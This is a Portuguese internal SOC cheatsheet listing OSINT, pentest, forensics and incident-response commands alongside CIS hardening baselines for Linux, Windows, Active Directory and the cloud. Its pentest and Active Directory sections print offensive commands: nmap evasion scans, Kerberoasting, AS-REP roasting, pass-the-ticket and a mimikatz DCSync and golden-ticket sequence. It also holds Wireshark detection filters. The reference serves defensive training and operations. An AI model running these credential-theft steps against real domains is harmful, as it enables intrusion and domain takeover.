<!-- Security Cheatsheet v3 · SOC Operations · Uso interno -->
<!-- Atualizado 2025 · 18 seções · 500+ itens -->

# 🔐 Security Cheatsheet `v3`
### SOC Operations · Uso interno · 18 seções · 500+ itens

---

## Índice

| # | Seção | # | Seção |
|---|-------|---|-------|
| 01 | [🔍 OSINT](#-osint) | 10 | [🪟 Windows Investigation](#-windows-investigation) |
| 02 | [⚡ Pentest / Hacking](#-pentest--hacking) | 11 | [⚙️ DevSecOps](#️-devsecops) |
| 03 | [🏛️ Active Directory](#️-active-directory) | 12 | [🐋 Docker / K8s Security](#-docker--k8s-security) |
| 04 | [🌐 Redes / Network](#-redes--network) | 13 | [🔒 AppSec / API Security](#-appsec--api-security) |
| 05 | [🚨 Incident Response](#-incident-response) | 14 | [🐧 Linux Hardening (CIS)](#-linux-hardening-cis) |
| 06 | [🦠 Malware Analysis](#-malware-analysis) | 15 | [🪟 Windows Hardening (CIS)](#-windows-hardening-cis) |
| 07 | [🔬 Forense Digital](#-forense-digital) | 16 | [🏰 AD Hardening (CIS)](#-ad-hardening-cis) |
| 08 | [🐧 Linux Investigation](#-linux-investigation) | 17 | [☁️ Cloud Hardening (CIS)](#️-cloud-hardening-cis) |
| 09 | [🪟 Windows Investigation](#-windows-investigation) | 18 | [🛡️ ISO/IEC 27001:2022](#️-isoiec-270012022) |

---

## 🔍 OSINT
> Open Source Intelligence · Reconhecimento passivo · `18 itens`

### Sites & Plataformas `WEB`

| Ferramenta | Descrição |
|------------|-----------|
| [osintframework.com](https://osintframework.com) | Framework completo de OSINT categorizado |
| [web-check.xyz](https://web-check.xyz) | Análise completa de URL: malware, DNS, headers, TLS |
| [shodan.io](https://shodan.io) | Motor de busca para serviços e dispositivos expostos |
| [censys.io](https://censys.io) | Asset discovery, certificados TLS, portas abertas |
| [viz.greynoise.io](https://viz.greynoise.io) | Identifica IPs que fazem scanning massivo |
| [urlscan.io](https://urlscan.io) | Análise completa de URLs com screenshot e DOM |
| [crt.sh](https://crt.sh) | Certificate Transparency — subdomínios via TLS certs |
| [ipinfo.io](https://ipinfo.io) | ASN, geolocation, abuse contact de IPs |
| [archive.org](https://archive.org) | Wayback Machine — histórico de páginas |
| [search4faces.com](https://search4faces.com) | Busca reversa de rostos em redes sociais |
| [ip-api.com](https://ip-api.com) | Geolocalização e info de IP/domínio (JSON API) |

### Ferramentas CLI `TOOL`

```bash
# theHarvester
theHarvester -d target.com -b google,bing,linkedin
theHarvester -d target.com -b all -f output.html

# amass — enumeração de subdomínios
amass enum -passive -d target.com
amass enum -active -d target.com -brute

# subfinder + httpx
subfinder -d target.com -silent | httpx -status-code -title
subfinder -d target.com | katana -jc  # JS crawling

# Reconhecimento DNS
whois target.com
dig +short MX target.com
dig target.com ANY @8.8.8.8
nslookup -type=TXT target.com
dnsx -d target.com -a -aaaa -cname -mx -ns -txt

# Shodan CLI
shodan search "org:target port:22 product:OpenSSH"
shodan host 1.2.3.4
shodan stats --facets port "org:target"
```

---

## ⚡ Pentest / Hacking
> Recon · Exploração · Pós-exploração · Serviços · `40+ itens`

### Ferramentas Principais `TOOLS`

| Ferramenta | Descrição |
|------------|-----------|
| nmap | Port scanner e detecção de serviços — essencial |
| metasploit | Framework de exploração — módulos, payloads, meterpreter |
| CrackMapExec | Swiss army knife para redes Windows/AD |
| impacket | Suite Python para ataques de rede/AD — PSExec, Secretsdump |
| mimikatz | Dump de credenciais Windows — LSASS, SAM, DPAPI |
| Responder | LLMNR/NBT-NS/mDNS poisoning — captura de hashes NTLMv2 |
| bettercap | Network attacks — ARP spoof, MITM, sniffing |
| nuclei | Scanner baseado em templates YAML — CVEs, misconfigs |
| ffuf | Fuzzing de diretórios, parâmetros, subdomínios |
| sqlmap | SQL Injection automatizado — dump de DB |

### Nmap Scanning `CMD`

```bash
# Reconhecimento rápido
nmap -sn 192.168.1.0/24              # ping sweep
nmap -sV -sC -p- --open target.com  # full port scan
nmap -sU -p 53,67,68,161 target.com # UDP ports

# NSE scripts
nmap --script=smb-vuln-* -p 445 target.com
nmap --script=http-* -p 80,443 target.com
nmap --script=vuln target.com

# Evasão
nmap -D RND:10 target.com           # decoys
nmap --data-length 25 -f target.com # fragmentation
nmap -sI zombie:port target.com     # idle/zombie scan
```

---

## 🏛️ Active Directory
> Ataques · Enumeração · Kerberos · Lateral Movement · `35+ itens`

### Enumeração AD `CMD`

```powershell
# PowerView
Get-Domain
Get-DomainUser -Properties samaccountname,memberof,admincount
Get-DomainComputer -Properties name,operatingsystem
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member
Get-DomainGPO | select displayname, gpcfilesyspath

# BloodHound collection
SharpHound.exe -c All --outputdirectory C:\temp\
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
```

### Ataques Kerberos `CMD`

```bash
# AS-REP Roasting
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# Pass-the-Ticket
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:base64ticket

# Golden Ticket
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

---

## 🌐 Redes / Network
> Análise · Captura · Diagnóstico · Segurança · `22 itens`

### Captura e Análise `CMD`

```bash
# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 'port 80 or port 443' -w http.pcap
tcpdump -i eth0 host 1.2.3.4 -w target.pcap

# Wireshark filters
http.request.method == "POST"
dns.qry.name contains "evil"
ip.addr == 192.168.1.1 && tcp.port == 4444
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN scan
frame contains "password"

# tshark CLI
tshark -r capture.pcap -Y 'http' -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -qz io,phs
tshark -i eth0 -Y 'dns' -T fields -e dns.qry.name
```

---

## 🚨 Incident Response
> Kill Chain · Playbooks · IOCs · Contenção · `25+ itens`

### MITRE ATT&CK Kill Chain `REF`

| Fase | Técnicas Comuns | Detecção |
|------|-----------------|----------|
| Reconnaissance | OSINT, port scan, email harvesting | Honeypot, rate limiting |
| Initial Access | Phishing, exploit public-facing, supply chain | Email gateway, EDR |
| Execution | PowerShell, WMI, scripts | Script Block Logging, Sysmon |
| Persistence | Registry run keys, scheduled tasks, services | Autoruns, Sysmon EventID 13 |
| Privilege Escalation | Token impersonation, UAC bypass, Kerberos | Sysmon, LSASS monitoring |
| Defense Evasion | Obfuscation, timestomping, AMSI bypass | AMSI, behavioral detection |
| Credential Access | Mimikatz, LSASS dump, Kerberoasting | Event 4625, 4648, 4769 |
| Lateral Movement | PsExec, WMI, RDP, Pass-the-Hash | Event 4624 (type 3), 4648 |
| Collection | File staging, keylogging, screen capture | DLP, file access auditing |
| Exfiltration | DNS tunneling, HTTPS, cloud upload | UEBA, DLP, NetFlow |

---

## 🦠 Malware Analysis
> Static · Dynamic · Sandboxes · IOCs · `20+ itens`

### Análise Estática `CMD`

```bash
# File info
file malware.exe
strings -n 6 malware.exe | grep -E "(http|cmd|reg|powershell)"
exiftool malware.exe
md5sum malware.exe && sha256sum malware.exe

# PE analysis
pescan malware.exe     # pefile
pehash malware.exe     # import hash
peframe malware.exe    # estrutura PE
objdump -d malware.exe | head -100  # disassembly

# Sandboxes online
# any.run, hybrid-analysis.com, cuckoo, triage, virustotal
```

---

## 🔬 Forense Digital
> Evidências · Memória · Disco · Timeline · `25+ itens`

### Forense de Memória `CMD`

```bash
# Volatility 3
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.netscan
vol -f memory.dmp windows.malfind    # injeção de código
vol -f memory.dmp windows.cmdline
vol -f memory.dmp windows.dlllist --pid 1234
vol -f memory.dmp windows.dumpfiles --pid 1234

# Dump de processos suspeitos
vol -f memory.dmp windows.handles --pid 1234
```

---

## 🐧 Linux Investigation
> Análise · Logs · Processos · Persistência · `30+ itens`

### Análise de Comprometimento `CMD`

```bash
# Processos e rede
ps auxf                              # process tree
ss -tulnp                           # conexões em escuta
lsof -i -n -P                      # conexões abertas
netstat -antp | grep ESTABLISHED

# Arquivos modificados recentemente
find / -mtime -1 -type f 2>/dev/null | grep -v /proc
find /tmp /var/tmp /dev/shm -type f 2>/dev/null

# Crontabs e persistência
crontab -l; cat /etc/cron*
ls /etc/init.d/ /etc/systemd/system/
find / -name "*.service" -newer /etc/passwd

# Usuários e logins
last -F                             # histórico de logins
lastb                               # tentativas falhas
cat /etc/passwd | awk -F: '$3==0'  # usuários root
grep -v nologin /etc/passwd         # shells válidas

# Logs críticos
tail -f /var/log/auth.log
journalctl -xe --since "1 hour ago"
ausearch -m avc -ts today           # SELinux denials
```

---

## 🪟 Windows Investigation
> Eventos · PowerShell · DFIR · Artefatos · `28+ itens`

### Event IDs Críticos `REF`

| Event ID | Descrição | Criticidade |
|----------|-----------|-------------|
| 4624 | Logon bem-sucedido | Monitorar tipo 3/10 |
| 4625 | Logon falho | `HIGH` — brute force |
| 4648 | Logon com credenciais explícitas | `HIGH` — PtH/PtT |
| 4672 | Logon com privilégios especiais | `HIGH` |
| 4688 | Processo criado (com linha de comando) | Baseline |
| 4698/4702 | Scheduled task criada/modificada | `HIGH` |
| 4720 | Conta de usuário criada | `MEDIUM` |
| 4732 | Membro adicionado ao grupo local | `HIGH` se admins |
| 4769 | Kerberos TGS request | Kerberoasting alert |
| 7045 | Serviço instalado | `HIGH` — malware |
| 1102 | Audit log cleared | `CRITICAL` |

### PowerShell Forense `CMD`

```powershell
# Event logs
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" | Select -First 20
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045}  # new services

# Processos e rede
Get-Process | Select Name,Id,CPU,WorkingSet | Sort CPU -Descending
Get-NetTCPConnection | Where State -eq "Established" | Select LocalPort,RemoteAddress,OwningProcess

# Persistência
Get-ScheduledTask | Where State -eq "Running"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

---

## ⚙️ DevSecOps
> CI/CD · SAST · DAST · Container Security · `20+ itens`

### Pipeline de Segurança `REF`

| Fase | Ferramenta | Descrição |
|------|------------|-----------|
| Pre-commit | gitleaks, detect-secrets | Detectar secrets no código |
| Build | SAST: Semgrep, SonarQube, Bandit | Análise estática de código |
| Build | SCA: Snyk, OWASP DC, Trivy | Dependências vulneráveis |
| Test | DAST: OWASP ZAP, nuclei | Scan dinâmico em staging |
| Container | Trivy, Grype, Syft | Vulnerabilidades em imagens |
| Deploy | OPA, Kyverno | Policy as Code em K8s |
| Runtime | Falco, Tetragon | Detecção em runtime |

---

## 🐋 Docker / K8s Security
> Container Hardening · Runtime · RBAC · Network · `22 itens`

### Docker Hardening `CMD`

```bash
# Auditoria CIS Docker
docker-bench-security/docker-bench-security.sh

# Boas práticas
docker run --rm --read-only --no-new-privileges \
  --cap-drop ALL --cap-add NET_BIND_SERVICE \
  --user 1001:1001 \
  --security-opt no-new-privileges:true \
  --memory 512m --cpus 0.5 \
  nginx:latest

# Verificar imagens
trivy image nginx:latest              # scan de vulnerabilidades
syft nginx:latest                     # SBOM
grype nginx:latest                    # CVE check
docker history --no-trunc nginx:latest # layers
```

### Kubernetes Security `CMD`

```bash
# kube-bench (CIS K8s Benchmark)
kube-bench run --targets master,node,etcd,policies

# RBAC auditoria
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.kind=="ServiceAccount")'
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Network Policies
kubectl get networkpolicy -A
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.spec.serviceAccountName}{"\n"}{end}'

# Secrets expostos
kubectl get secrets -A
kubectl describe secret <name> -n <ns>
```

---

## 🔒 AppSec / API Security
> OWASP · JWT · Ferramentas · `25+ itens`

### OWASP Top 10 (2021) `REF`

| ID | Vulnerabilidade | Impacto |
|----|-----------------|---------|
| A01 | Broken Access Control | Acesso não autorizado a recursos |
| A02 | Cryptographic Failures | Exposição de dados sensíveis |
| A03 | Injection (SQL, XSS, etc.) | Execução de código/comandos |
| A04 | Insecure Design | Ausência de controles por design |
| A05 | Security Misconfiguration | Exposição desnecessária de superfície |
| A06 | Vulnerable Components | Bibliotecas com CVEs conhecidos |
| A07 | Auth & Session Failures | Comprometimento de identidade |
| A08 | Software & Data Integrity | Supply chain, CI/CD sem validação |
| A09 | Logging & Monitoring Failures | Incidentes não detectados |
| A10 | SSRF | Acesso a serviços internos via servidor |

---

## 🐧 Linux Hardening (CIS)
> CIS Linux Benchmark · Ubuntu/RHEL/Debian · Configuração defensiva · `45 controles`

### 1. Filesystem & Boot `CIS L1`

```bash
# /etc/modprobe.d/disable-fs.conf — desabilitar filesystems desnecessários
install cramfs /bin/true
install freevxfs /bin/true
install jffs2 /bin/true
install hfs /bin/true
install hfsplus /bin/true
install udf /bin/true

# /etc/fstab — opções de segurança
/tmp     tmpfs  defaults,rw,nosuid,nodev,noexec  0 0
/var/tmp tmpfs  defaults,rw,nosuid,nodev,noexec  0 0
/home    ext4   defaults,nosuid,nodev             0 1
/dev/shm tmpfs  defaults,rw,nosuid,nodev,noexec  0 0

# GRUB password
grub2-mkpasswd-pbkdf2
chmod og-rwx /boot/grub2/grub.cfg
chown root:root /boot/grub2/grub.cfg
```

### 2. Network Hardening (sysctl) `CIS L1`

```bash
# /etc/sysctl.d/99-cis-hardening.conf
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.tcp_syncookies = 1
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1

# Aplicar
sysctl -p /etc/sysctl.d/99-cis-hardening.conf
```

### 3. Logging & Auditd `CIS L2`

```bash
# /etc/audit/rules.d/99-cis.rules
## Mudanças de data/hora
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -k time-change
-w /etc/localtime -p wa -k time-change

## Usuários e grupos
-w /etc/group -p wa -k identity
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k identity

## Acesso a arquivos (permissão negada)
-a always,exit -F arch=b64 -S creat -S open -S openat -S truncate -F exit=-EACCES -k access
-a always,exit -F arch=b64 -S creat -S open -S openat -S truncate -F exit=-EPERM -k access

## Comandos privilegiados
-a always,exit -F path=/usr/bin/sudo -F perm=x -F auid>=1000 -F auid!=-1 -k privileged
-a always,exit -F path=/usr/bin/su -F perm=x -F auid>=1000 -F auid!=-1 -k privileged

## Network connections
-a always,exit -F arch=b64 -S socket -F a0=2 -k network_connect

## Tornar regras imutáveis
-e 2
```

### 4. Acesso & Autenticação `CIS L1`

| Controle | Configuração | Arquivo |
|----------|--------------|---------|
| PAM senhas | `minlen=14, ucredit=-1, lcredit=-1, dcredit=-1, ocredit=-1, remember=5` | `/etc/security/pwquality.conf` |
| PAM lockout | `deny=5, unlock_time=900, fail_interval=900` | `/etc/pam.d/system-auth` |
| Shadow expiration | `PASS_MAX_DAYS=90, PASS_MIN_DAYS=1, PASS_WARN_AGE=7` | `/etc/login.defs` |
| sudo | `NOPASSWD proibido, timeout=15min, logfile=/var/log/sudo.log, requiretty` | `/etc/sudoers` |
| SSH | `PermitRootLogin no, PasswordAuthentication no, MaxAuthTries 4, X11Forwarding no` | `/etc/ssh/sshd_config` |
| umask | `umask 027` | `/etc/profile`, `/etc/bashrc` |
| Contas inativas | `useradd -D -f 30` | Sistema |
| Cron | Criar `/etc/cron.allow`, remover `/etc/cron.deny` | Sistema |

### 5. Serviços & Permissões `CIS L1`

```bash
# Desabilitar serviços desnecessários
for svc in xinetd inetd avahi-daemon cups nfs rpcbind rsync nis bluetooth talk; do
  systemctl disable --now $svc 2>/dev/null
done

# Permissões de arquivos críticos
chmod 644 /etc/passwd /etc/group
chmod 640 /etc/shadow /etc/gshadow
chmod 600 /etc/ssh/sshd_config
chmod 700 /root
chmod 1777 /tmp /var/tmp
chown root:root /etc/passwd /etc/shadow /etc/sudoers

# Encontrar SUID/SGID suspeitos
find / -perm /6000 -type f 2>/dev/null | grep -v -E "(sudo|su|ping|passwd)"

# Firewall UFW baseline
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw enable
```

---

## 🪟 Windows Hardening (CIS)
> CIS Windows Server 2022 / Windows 11 · GPO · Security Baseline · `50 controles`

### 1. Account Policies `CIS L1`

| Política | Valor CIS |
|----------|-----------|
| Minimum password length | 14 caracteres |
| Maximum password age | 60 dias |
| Minimum password age | 1 dia |
| Enforce password history | 24 senhas |
| Password complexity | Habilitado |
| Account lockout threshold | 5 tentativas |
| Account lockout duration | 15 minutos |
| Reset lockout counter | 15 minutos |
| Kerberos max ticket age | 10 horas |
| Kerberos max renewal age | 7 dias |
| Clock synchronization | 5 minutos |

### 2. Audit Policies `CIS L1`

| Categoria | Configuração |
|-----------|--------------|
| Account Logon — Credential Validation | Success/Failure |
| Account Logon — Kerberos AS/TGS | Success/Failure |
| Account Management — User/Group | Success/Failure |
| Logon/Logoff — Logon | Success/Failure |
| Logon/Logoff — Special Logon | Success |
| Object Access — File Share | Success/Failure |
| Object Access — Removable Storage | Success/Failure |
| Policy Change — Audit Policy | Success/Failure |
| Privilege Use — Sensitive | Success/Failure |
| System — Security State Change | Success |

### 3. Security Options (GPO) `CIS L1`

| Opção | Configuração CIS |
|-------|------------------|
| UAC Admin Approval Mode | Enabled |
| UAC Prompt behavior (admin) | Prompt for credentials |
| LAN Manager Auth Level | Send NTLMv2 only (5) |
| SMB Server Signing | Always required |
| Network access: Anonymous enum SAM | Disabled |
| Interactive logon: Last username | Do not display |
| Ctrl+Alt+Del required | Enabled |
| RDP NLA | Required |
| RDP Encryption Level | High (128-bit) |
| WDigest Authentication | Disabled |
| Credential Guard | Enabled (UEFI lock) |

### 4. Services & Features `CIS L1`

```powershell
# Desabilitar serviços CIS
$services = @("Browser","FTPSVC","SSDPSRV","upnphost","WMSvc",
              "TlntSvr","SNMP","RemoteRegistry","Fax")
foreach ($svc in $services) {
  Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
  Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
}

# Remover features desnecessárias
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName "TelnetClient" -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2" -NoRestart

# Verificar SMB v1
Get-SmbServerConfiguration | Select EnableSMB1Protocol
```

### 5. Windows Firewall & Defender `CIS L1`

```powershell
# Habilitar todos os perfis
Set-NetFirewallProfile -All -Enabled True `
  -DefaultInboundAction Block `
  -DefaultOutboundAction Allow `
  -LogAllowed True -LogBlocked True `
  -LogMaxSizeKilobytes 16384

# Bloquear admin ports de internet
New-NetFirewallRule -DisplayName "Block RDP External" -Direction Inbound `
  -Protocol TCP -LocalPort 3389 -RemoteAddress Internet -Action Block
New-NetFirewallRule -DisplayName "Block WinRM External" -Direction Inbound `
  -Protocol TCP -LocalPort 5985,5986 -RemoteAddress Internet -Action Block

# Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting Advanced
Set-MpPreference -EnableNetworkProtection Enabled
Set-MpPreference -AttackSurfaceReductionRules_Actions Enabled
Set-MpPreference -PUAProtection Enabled
```

### 6. User Rights `CIS L1`

| Direito | Configuração |
|---------|--------------|
| Deny network access | Guests, Local Accounts |
| Deny logon locally | Guests |
| Deny RDP logon | Guests, Local Accounts |
| Manage audit log | Somente Administrators |
| Debug programs | Somente Administrators |
| Act as operating system | Nenhum usuário |
| SeBackupPrivilege | Somente Backup Operators |

---

## 🏰 AD Hardening (CIS)
> CIS AD DS · Privileged Access · Tiering Model · Delegation · `40 controles`

### 1. Políticas de Conta & Autenticação `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Default Domain Policy | Min 14 chars, max 60d, lockout 5/15min |
| Fine-Grained PSO (admins) | Min 20 chars, lockout 3/60min |
| NTLM Restriction (Tier 0) | Deny All outgoing NTLM |
| Kerberos Encryption | Somente AES128/AES256 — sem DES/RC4 |
| Protected Users Group | Todas as contas Tier 0 |
| Smart Card/MFA | Exigir para contas privilegiadas |

### 2. Tiered Admin Model `REF`

| Tier | Escopo | Controles |
|------|--------|-----------|
| **Tier 0** | Domain Admins, Enterprise Admins, Schema Admins, DCs | PAW dedicado, sem internet, MFA obrigatório |
| **Tier 1** | Server Admins, Service Accounts | Acesso somente a servidores, não loga em workstations |
| **Tier 2** | Helpdesk, Desktop Admins | Acesso somente a workstations, nunca a DCs |
| **PAW** | Privileged Access Workstation | Sem email, sem browser, AppLocker restritivo |
| **JIT** | Just-In-Time (PIM/grupos temporários) | Acesso privilegiado on-demand com expiração |

### 3. Delegation & ACL Hardening `CIS L2`

```powershell
# Auditar delegações perigosas — irrestrita
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# Remover delegação irrestrita
Set-ADAccountControl -Identity "COMPUTER$" -TrustedForDelegation $false

# ACLs perigosas em objetos críticos
Get-Acl "AD:\DC=domain,DC=local" | Select -ExpandProperty Access |
  Where {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"} |
  Select IdentityReference, ActiveDirectoryRights

# AdminSDHolder
Get-ADObject -Filter {AdminCount -eq 1} -Properties AdminCount | Select Name, DistinguishedName
```

### 4. GPO Security Hardening `CIS L1`

```powershell
# PowerShell Logging (GPO — Computer\Windows PowerShell)
# Script Block Logging: Enabled
# Module Logging: Enabled
# Transcription: Enabled

# AppLocker — gerar regras default
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path "C:\Windows\System32\cmd.exe"
# Bloquear execução em: %TEMP%, %APPDATA%, Downloads

# LDAP Signing & Channel Binding
# GPO: Computer\Windows Settings\Security Settings\Local Policies\Security Options
# Domain controller: LDAP server signing requirements = Require signing
```

### 5. DC Hardening `CIS L1`

| Controle | Configuração |
|----------|--------------|
| SYSVOL Permissions | Somente admins escrevem — auditoria regular |
| Restricted Admin Mode | Habilitar RDP com Restricted Admin para DCs |
| LDAP Signing | Require signing + channel binding obrigatório |
| SMB Signing | Obrigatório em todos os DCs |
| DNS Hardening | Sem recursion para externos, DNSSEC interno |
| KRBTGT Rotation | Reset 2x (intervalo 10h) após comprometimento |
| Event 4929 | Monitorar tentativas DCshadow |

---

## ☁️ Cloud Hardening (CIS)
> AWS · Azure · GCP · IAM · Logging · Network · Storage · `55 controles`

### AWS — IAM & Account `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Root Account | MFA obrigatório, sem access keys |
| IAM Password Policy | Min 14 chars, 1 upper/lower/num/symbol, 90d, history 24 |
| MFA para IAM Users | Obrigatório para todos com console access |
| Access Key Rotation | Rotacionar a cada 90 dias, desativar inativos |
| IAM Least Privilege | Sem wildcards "*", usar roles para serviços |

```bash
# CloudTrail — habilitar todas as regiões
aws cloudtrail create-trail \
  --name cis-trail \
  --s3-bucket-name my-cloudtrail-logs \
  --is-multi-region-trail \
  --enable-log-file-validation
aws cloudtrail start-logging --name cis-trail

# CloudWatch — alarmes CIS obrigatórios
# Monitorar: Root usage, unauthorized API calls, IAM changes,
# CloudTrail changes, S3 bucket policy changes, VPC SG changes,
# Console signin without MFA, Network gateway changes
```

### AWS — Network & Storage `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Security Groups | Sem 0.0.0.0/0 nas portas 22 e 3389 |
| VPC Flow Logs | Habilitar em todos os VPCs — reter 90 dias |
| Default VPC | Não usar — deletar ou não associar recursos |
| S3 Block Public Access | Em todas as buckets e nível da conta |
| S3 Encryption | SSE-S3 ou SSE-KMS obrigatório |
| EBS Encryption | `aws ec2 enable-ebs-encryption-by-default` |
| KMS Key Rotation | Auto rotation 365 dias em todas as CMKs |
| GuardDuty | Habilitar em todas as regiões via Organizations |

### Azure — IAM & Defender `CIS L1`

| Controle | Configuração |
|----------|--------------|
| MFA / Conditional Access | MFA para todos, bloquear legacy auth |
| Global Admin | Máximo 5, todos com MFA |
| Microsoft Defender for Cloud | Habilitar em todas as subscriptions |
| Defender Plans | Servers, Storage, SQL, App Service, Key Vault, DNS |
| RBAC | Sem Owner/Contributor para externos, PIM para privilegiados |
| Activity Logs | Retenção 1 ano, export para Log Analytics |

### Azure — Storage & Network `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Storage HTTPS | Require secure transfer, disable public blob access |
| Storage Firewall | Restringir a VNets e IPs específicos |
| Key Vault | Purge protection + soft delete, firewall habilitado |
| NSG Flow Logs | Habilitar em todos os NSGs, retenção 90 dias |
| DDoS Protection | Azure DDoS Network Protection em VNets de produção |
| Disk Encryption | Azure Disk Encryption com CMK no Key Vault |

### GCP — CIS Foundations `CIS L1`

| Controle | Configuração |
|----------|--------------|
| IAM Service Accounts | Sem admin roles, sem keys > 90 dias |
| MFA / 2-Step | Enforçar em todos via Organization policy |
| Cloud Audit Logs | Data Access logs (Read+Write) em todos os serviços |
| GCS Public Access | `constraints/storage.publicAccessPrevention = Enforced` |
| VPC Firewall | Sem 0.0.0.0/0 nas portas 22 e 3389 |
| CMEK | Customer-managed keys — rotação anual |
| Cloud SCC | Security Command Center Premium habilitado |

---

## 📋 Hardening Baselines
> CIS vs STIG vs NIST · Quick-Win Checklist · Ferramentas de Auditoria · `35 itens`

### CIS vs STIG vs NIST — Comparativo

| Critério | CIS Benchmark | DISA STIG | NIST SP 800-53 |
|----------|---------------|-----------|----------------|
| Público-alvo | Empresas privadas, qualquer setor | DoD/governo EUA | Agências federais, referência global |
| Nível de risco | L1 (básico) e L2 (avançado) | CAT I (crítico) a CAT III (baixo) | Low / Moderate / High |
| Atualização | Frequente, comunidade ativa | DISA valida periodicamente | Revisões periódicas (Rev 5) |
| Automação | CIS-CAT Pro, InSpec, Ansible | SCAP/SCC, Ansible STIG | OSCAL, OpenSCAP |
| Conformidade | PCI-DSS, HIPAA, ISO 27001, SOC2 | FISMA, FedRAMP (parcial) | FISMA, FedRAMP, CMMC |
| Custo | PDFs gratuitos, CIS-CAT pago | Gratuito | Gratuito |

### Baseline por Sistema Operacional

| Sistema | Framework | Ferramenta de Auditoria |
|---------|-----------|-------------------------|
| Ubuntu 22.04/24.04 | CIS Benchmark L1/L2 | CIS-CAT, Lynis, OpenSCAP |
| RHEL / AlmaLinux 9 | CIS + STIG | OpenSCAP, oscap-anaconda |
| Windows Server 2022 | CIS L1 + MS Security Baseline | CIS-CAT, LGPO, Policy Analyzer |
| Windows 11 | CIS L1 + MS Intune Baseline | CIS-CAT, Intune Compliance |
| macOS Sonoma | CIS macOS Benchmark | CIS-CAT, mSCP, Nessus |
| AWS | CIS AWS Foundations v3.0 | AWS Security Hub, Prowler |
| Azure | CIS Azure Foundations v2.1 | Defender for Cloud, Steampipe |
| GCP | CIS GCP Foundations v3.0 | Security Command Center, Forseti |
| Docker | CIS Docker Benchmark v1.6 | docker-bench-security, Trivy |
| Kubernetes | CIS K8s Benchmark v1.9 | kube-bench, Falco, Kubescape |

### Quick-Win Checklist Universal

| Prioridade | Controle | Objetivo |
|------------|----------|----------|
| 🔴 CRÍTICO | Patches | SO e aplicações atualizados — patch mensal mínimo |
| 🔴 CRÍTICO | MFA | Autenticação multifator em todas as contas privilegiadas |
| 🔴 CRÍTICO | Firewall | Default deny inbound, log de bloqueios, revisão mensal |
| 🟠 ALTO | Logging | Logs centralizados em SIEM, retenção 12 meses, alertas RT |
| 🟠 ALTO | Least Privilege | Sem admin desnecessário, roles mínimas em service accounts |
| 🟠 ALTO | Encryption | Disco cifrado (BitLocker/LUKS), TLS 1.2+, dados em repouso |
| 🟡 MÉDIO | Inventory | CMDB atualizado — hardware, software, cloud assets |
| 🟡 MÉDIO | Backup | Backups imutáveis testados (3-2-1 rule) |
| 🟡 MÉDIO | EDR/AV | EDR em todos os endpoints, telemetria no SIEM |
| 🟢 PADRÃO | Vuln Scan | Scan mensal autenticado, CVSS ≥ 7.0 remediado em 30d |
| 🟢 PADRÃO | SSH Keys | Sem senhas em SSH, authorized_keys auditado |
| 🟢 PADRÃO | NTP | Sincronização NTP confiável — crítico para Kerberos e logs |

### Ferramentas de Auditoria `TOOL`

| Ferramenta | Escopo | Comando |
|------------|--------|---------|
| Lynis | Linux hardening audit | `lynis audit system --pentest` |
| OpenSCAP | SCAP/OVAL multi-OS | `oscap xccdf eval --profile cis ...` |
| CIS-CAT Pro | Benchmark oficial CIS | GUI/CLI com relatório HTML |
| Prowler | AWS/Azure/GCP 300+ checks | `prowler -p cis -r eu-west-1` |
| ScoutSuite | Multi-cloud audit | `scout aws --report-dir ./report` |
| docker-bench | CIS Docker | `./docker-bench-security.sh` |
| kube-bench | CIS Kubernetes | `kube-bench run --targets master,node` |
